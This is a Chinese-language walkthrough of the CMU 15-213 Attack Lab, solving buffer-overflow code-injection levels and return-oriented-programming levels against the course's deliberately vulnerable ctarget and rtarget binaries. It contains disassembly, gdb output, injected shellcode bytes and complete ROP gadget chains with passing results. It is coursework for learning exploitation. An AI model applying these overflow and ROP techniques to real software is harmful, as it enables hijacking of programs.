# Attack Lab

## Part I: Code Injection Attacks

### Level 1

ctarget将执行test函数，test函数如下：

```c
void test()
{
  int val;
  val = getbuf();
  printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

任务是使得test函数执行完getbuf()后跳转到touch1

touch1函数如下

```c
void touch1()
{
  vlevel = 1; /* Part of validation protocol */
  printf("Touch1!: You called touch1()\n");
  validate(1);
  exit(0);
}
```

反汇编ctarget

```shell
objdump -d ctarget | less
```

得到getbuf和touch1的汇编代码如下

```assembly
00000000004017a8 <getbuf>:
  4017a8:       48 83 ec 28             sub    $0x28,%rsp
  4017ac:       48 89 e7                mov    %rsp,%rdi
  4017af:       e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:       b8 01 00 00 00          mov    $0x1,%eax
  4017b9:       48 83 c4 28             add    $0x28,%rsp
  4017bd:       c3                      retq
  4017be:       90                      nop
  4017bf:       90                      nop
```

```assembly
00000000004017c0 <touch1>:
  4017c0:       48 83 ec 08             sub    $0x8,%rsp
  4017c4:       c7 05 0e 2d 20 00 01    movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:       00 00 00
  4017ce:       bf c5 30 40 00          mov    $0x4030c5,%edi
  4017d3:       e8 e8 f4 ff ff          callq  400cc0 <puts@plt>
  4017d8:       bf 01 00 00 00          mov    $0x1,%edi
  4017dd:       e8 ab 04 00 00          callq  401c8d <validate>
  4017e2:       bf 00 00 00 00          mov    $0x0,%edi
  4017e7:       e8 54 f6 ff ff          callq  400e40 <exit@plt>
```

分析getbuf，由第一行可以得到开辟了0x28即40个byte的空间，接收完毕执行ret返回时将取回rsp中的地址。

分析touch1，touch1函数的进入地址为0x4017c0。

本任务的目标是修改rsp使得getbuf执行ret时取回的地址为touch1的地址。

我们要输入11个32位数据使得缓冲区溢出

hex2raw的用法：

*HEX2RAW expects two-digit hex values separated by one or more white spaces. So if you want to create a byte with a hex value of 0, you need to write it as 00. To create the word 0xdeadbeef you should pass “ef be ad de” to HEX2RAW (note the reversal required for little-endian byte ordering).*

则输入的数据为

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 <- 溢出内容，注意栈是8byte的
```

生成cl1hex.txt文件，通过hex2raw转换成需要输入的数据

```shell
./hex2raw < cl1hex.txt > cl1raw.txt
```

将cl1raw.txt输入ctarget，结果

```
$ ./ctarget -qi cl1raw.txt
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00
```

### Level 2

要求执行完getbuf后跳转到touch2函数并输入参数，即cookie

touch2函数如下

```C
void touch2(unsigned val)
{
  vlevel = 2; /* Part of validation protocol */
  if (val == cookie) {
    printf("Touch2!: You called touch2(0x%.8x)\n", val);
    validate(2);
  } else {
    printf("Misfire: You called touch2(0x%.8x)\n", val);
    fail(2);
  }
  exit(0)
}
```

反汇编得到touch2的汇编代码：

```assembly
00000000004017ec <touch2>:
  4017ec:       48 83 ec 08             sub    $0x8,%rsp
  4017f0:       89 fa                   mov    %edi,%edx
  4017f2:       c7 05 e0 2c 20 00 02    movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:       00 00 00
  4017fc:       3b 3d e2 2c 20 00       cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:       75 20                   jne    401824 <touch2+0x38>
  401804:       be e8 30 40 00          mov    $0x4030e8,%esi
  401809:       bf 01 00 00 00          mov    $0x1,%edi
  40180e:       b8 00 00 00 00          mov    $0x0,%eax
  401813:       e8 d8 f5 ff ff          callq  400df0 <__printf_chk@plt>
  401818:       bf 02 00 00 00          mov    $0x2,%edi
  40181d:       e8 6b 04 00 00          callq  401c8d <validate>
  401822:       eb 1e                   jmp    401842 <touch2+0x56>
  401824:       be 10 31 40 00          mov    $0x403110,%esi
  401829:       bf 01 00 00 00          mov    $0x1,%edi
  40182e:       b8 00 00 00 00          mov    $0x0,%eax
  401833:       e8 b8 f5 ff ff          callq  400df0 <__printf_chk@plt>
  401838:       bf 02 00 00 00          mov    $0x2,%edi
  40183d:       e8 0d 05 00 00          callq  401d4f <fail>
  401842:       bf 00 00 00 00          mov    $0x0,%edi
  401847:       e8 f4 f5 ff ff          callq  400e40 <exit@plt>
```

需要输入参数cookie，因此要先将cookie移入rdi寄存器，再执行touch2，即ret touch2的地址0x4017ec

转换为汇编代码即

```assembly
movq $0x59b997fa %rdi
pushq $0x4017ec
ret
```

首先编写上述汇编程序cl2.s，汇编后反汇编

```shell
gcc -c cl2.s -o cl2.o
objdump -d cl2.o > cl2.txt
```

得到需要注入的指令为

```assembly
0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq
```

则指令序列如下：

```
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3
```

接下来要找到getbuf执行完毕后%rsp的地址，即注入代码的起始地址

利用gdb调试

```
(gdb) b getbuf
Breakpoint 1 at 0x4017a8: file buf.c, line 12.
(gdb) r -q
Starting program: /media/sf_virtualBoxShare/15-213/attacklab/target1/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12
12	buf.c: No such file or directory.
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq
End of assembler dump.
(gdb) stepi
14	in buf.c
(gdb) x $rsp
0x5561dc78:	0x00000000
```

得到rsp为0x5561dc78

则我们的攻击序列为

```
48 c7 c7 fa 97 b9 59 68 
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

结果：

```shell
$ ./ctarget -qi cl2raw.txt
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
```

### Level 3

需要跳转至touch3函数，touch3如下

```c
void touch3(char *sval)
{
  vlevel = 3; /* Part of validation protocol */
  if (hexmatch(cookie, sval)) {
    printf("Touch3!: You called touch3(\"%s\")\n", sval);
    validate(3);
  } else {
    printf("Misfire: You called touch3(\"%s\")\n", sval);
    fail(3);
  }
  exit(0);
}
```

输入参数为你输入的cookie字符串地址，touch3函数内部还包括hexmatch函数，比较时会将cookie代表的数值转化为其16进制数的字符串

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
  char cbuf[110];
  /* Make position of check string unpredictable */
  char *s = cbuf + random() % 100;
  sprintf(s, "%.8x", val);
  return strncmp(sval, s, 9) == 0;
}
```

touch3的反汇编代码如下

```assembly
00000000004018fa <touch3>:
  4018fa:       53                      push   %rbx
  4018fb:       48 89 fb                mov    %rdi,%rbx
  4018fe:       c7 05 d4 2b 20 00 03    movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:       00 00 00
  401908:       48 89 fe                mov    %rdi,%rsi
  40190b:       8b 3d d3 2b 20 00       mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911:       e8 36 ff ff ff          callq  40184c <hexmatch>
  401916:       85 c0                   test   %eax,%eax
  401918:       74 23                   je     40193d <touch3+0x43>
  40191a:       48 89 da                mov    %rbx,%rdx
  40191d:       be 38 31 40 00          mov    $0x403138,%esi
  401922:       bf 01 00 00 00          mov    $0x1,%edi
  401927:       b8 00 00 00 00          mov    $0x0,%eax
  40192c:       e8 bf f4 ff ff          callq  400df0 <__printf_chk@plt>
  401931:       bf 03 00 00 00          mov    $0x3,%edi
  401936:       e8 52 03 00 00          callq  401c8d <validate>
  40193b:       eb 21                   jmp    40195e <touch3+0x64>
  40193d:       48 89 da                mov    %rbx,%rdx
  401940:       be 60 31 40 00          mov    $0x403160,%esi
  401945:       bf 01 00 00 00          mov    $0x1,%edi
  40194a:       b8 00 00 00 00          mov    $0x0,%eax
  40194f:       e8 9c f4 ff ff          callq  400df0 <__printf_chk@plt>
  401954:       bf 03 00 00 00          mov    $0x3,%edi
  401959:       e8 f1 03 00 00          callq  401d4f <fail>
  40195e:       bf 00 00 00 00          mov    $0x0,%edi
  401963:       e8 d8 f4 ff ff          callq  400e40 <exit@plt>
```

地址为0x4018fa

```c
char *s = cbuf + random() % 100;
```

传入cookie时要注意首地址的设置，因为hexmatch会申请100字节的空间，由于地址位置是随机的因此如果将cookie放置在getbuf可能会导致其被覆盖。因此将cookie放置在getbuf父栈帧中

运行gdb，在getbuf处设置断点

```shell
(gdb) r -q
Starting program: /media/sf_virtualBoxShare/15-213/attacklab/target1/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12
12	buf.c: No such file or directory.
(gdb) disas getbuf
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq
End of assembler dump.
(gdb) x $rsp
0x5561dca0:	0x00000000
```

得到输入字符串首地址，即缓冲区溢出的位置应该为0x5561dca0 + 0x8 = 0x5561dca8

因此注入的代码为：

```assembly
mov $0x5561dca8 %rdi
pushq $0x4018fa
retq
```

编译后再反汇编

```shell
$ gcc -c cl3.s -o cl3.o
$ objdump -d cl3.o

cl3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq
```

则指令序列如下：

```
48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3
```

利用man ascii命令得到cookie（59b997fa）各字符的16进制数表示为

```
35 39 62 39 39 37 66 61 00
```

字符串末尾为'\0'，其16进制为00

getbuf得到的数组的首地址为0x5561dca0 - 0x28 = 0x0x5561dc78

则最终的指令序列为

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 
00 00 00 00 00 00 00 00
```

得到结果：

```shell
$ ./ctarget -qi cl3raw.txt
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00
```



## Part II: Return-Oriented Programming

### Level 2

本任务是以ROP形式重复Part I中的Level 2任务，劫持程序流返回touch2。

能够使用的指令只有以下几种：movq，popq，ret，nop

![image-20200701160700216](/Users/rui/Library/Application Support/typora-user-images/image-20200701160700216.png)

由于rtarget启用了`ASLR`和`No eXecute`标记，因此无法使用代码注入，但是没有设置Stack Canary，因此我们可以从程序的TEXT断里面需要可以利用的机器代码片段(也叫做`Gadget`)，利用程序栈把一系列的`Gadget`串起来完成攻击，因此要求这些片段是在`retq`（x86的返回语句）之前。

我们要做的事情是：

第一，将%rdi设置为cookie

第二，执行touch2

转化为汇编程序即：

```assembly
movq $0x59b997fa %rdi
pushq $0x4017ec
ret
```

现在要输入touch2函数的参数，即movq $data, %rdi，有两种方法

第一，直接执行movq $data, %rdi

第二，传入寄存器的数据压栈，再出栈送入相应的寄存器，然后执行touch2

反汇编rtarget程序，gadget在start_farm和end_farm之间，找到两个可用的`gadget`

```assembly
00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3                      retq
```

```assembly
00000000004019a0 <addval_273>:
  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:       c3                      retq
```

58 90 c3即

```assembly
4019ab: 58 popq %rax
4019ac: 90 nop
4019ad: c3 retq
```

48 89 c7 c3即

```assembly
4019a2: 48 89 c7 movq %rax %rdi
4019a5: c3       retq
```

因此输入的数据为

```
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
ab 19 40 00      <- 跳转到0x4019ab执行popq %rax，同时rsp + 8
00 00 00 00      
fa 97 b9 59      <- retq执行后rsp + 8指向本一行，将该数赋给rax后rsp + 8
00 00 00 00      
a2 19 40 00      <- 0x4019ad的retq执行前rsp指向该行，执行后跳转至0x4019a2 
00 00 00 00
ec 17 40 00      <- 0x4019a5的retq执行前rsp指向该行，执行后跳转至touch2
00 00 00 00
```

结果：

```shell
$ ./rtarget -qi rl2raw.txt
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

### Level 3

本题要求通过ROP形式来运行touch3。由于栈随机化因此无法预知字符串地址

获得栈的起始地址可以通过movq %rsp, <>命令实现

我们首先设置一个偏移量把字符串存放到rsp的相对地址，然后根据rsp的值和偏移量得出字符串的绝对地址。

farm中存在这样一个gadget

```assembly
00000000004019d6 <add_xy>:
  4019d6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:       c3                      retq
```

我们可以先获得rsp的值传入rdi，在获得偏移量传入rsi，相加得到字符串地址再传到rdi

```assembly
0000000000401a03 <addval_190>:
  401a03:       8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax
  401a09:       c3                      retq

00000000004019a0 <addval_273>:
  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:       c3                      retq

00000000004019ca <getval_280>:
  4019ca:       b8 29 58 90 c3          mov    $0xc3905829,%eax
  4019cf:       c3   
  
00000000004019db <getval_481>:
  4019db:       b8 5c 89 c2 90          mov    $0x90c2895c,%eax
  4019e0:       c3                      retq
  
0000000000401a6e <setval_167>:
  401a6e:       c7 07 89 d1 91 c3       movl   $0xc391d189,(%rdi)
  401a74:       c3                      retq
  
0000000000401a11 <addval_436>:
  401a11:       8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax
  401a17:       c3                      retq
  
00000000004019a0 <addval_273>:
  4019a0:       8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:       c3                      retq
```

其中

```assembly
401a06: 48 89 e0 movq %rsp, %rax
401a09: c3       retq

4019a2: 48 89 c7 movq %rax, %rdi
4019a6: c3       retq

4019cc: 58 popq %rax
4019cd: 90 nop
4019ce: c3 retq

401a72: 91    xchg %ecx, %eax  #eax和ecx交换
401a73: c3    retq

401a13: 89 ce movl %ecx, %esi
401a15: 90         nop
401a16: 90         nop
401a17: c3         retq

4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax
4019da: c3          retq

4019a2: 48 89 c7 movq %rax %rdi
4019a5: c3       retq
```

栈结构如图所示(此图和下文的实现有不同，在movl %edx, ecx)

<img src="/Users/rui/Library/Application Support/typora-user-images/image-20200701200440039.png" alt="image-20200701200440039" style="zoom:50%;" />

因此指令码如下，可以看到cookie地址前有8个指令64byte，因此偏移量为0x40：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00  <- movq %rsp, %rax
a2 19 40 00 00 00 00 00  <- movq %rax, %rdi
cc 19 40 00 00 00 00 00  <- popq %rax
40 00 00 00 00 00 00 00  <- 偏移量，popq %rax执行时rsp的位置，执行后rsp指向下一行
72 1a 40 00 00 00 00 00  <- exch %ecx, %eax
13 1a 40 00 00 00 00 00  <- movl %ecx, %esi
d6 19 40 00 00 00 00 00  <- lea (%rdi,%rsi,1),%rax
a2 19 40 00 00 00 00 00  <- movq %rax %rdi
fa 18 40 00 00 00 00 00  <- touch3
35 39 62 39 39 37 66 61  <- cookie
00 00 00 00 00 00 00 00
```

结果：

```shell
$ ./rtarget -qi rl3raw.txt
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 40 00 00 00 00 00 00 00 72 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00
```











